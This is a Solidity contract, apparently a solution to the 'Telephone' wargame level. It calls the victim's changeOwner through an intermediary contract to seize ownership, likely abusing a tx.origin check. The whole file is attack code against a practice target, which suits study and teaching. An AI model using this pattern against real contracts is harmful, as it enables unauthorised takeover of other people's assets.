// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Telephone} from "./Telephone.sol";

contract AttackTelephone {
    Telephone private victimContract;

    constructor(address _victimContract) {
        victimContract = Telephone(_victimContract);
    }

    function ownerChange() external {
        victimContract.changeOwner(msg.sender);
    }
}
